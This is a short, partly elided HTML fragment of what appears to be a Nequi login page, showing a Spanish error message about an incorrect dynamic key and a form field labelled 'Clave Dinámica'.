    ...
    <div id="content">
        ...
        <section class="login-section ng-scope" ng-controller="loginController as loginControl">
            <div class="login-wrap">
                ...
                <p class="ng-binding">Ups, esa no es la clave dinámica de tu nequi. La encuentras en la parte superior de la App.</p>
                <div class="login-form-wrap">
                    <div class="container-form">
                        ...
                        <div class="form-group">
                            ...
                            <label for="j_dinamica" class="ng-binding">Clave Dinámica</label>
                        </div>
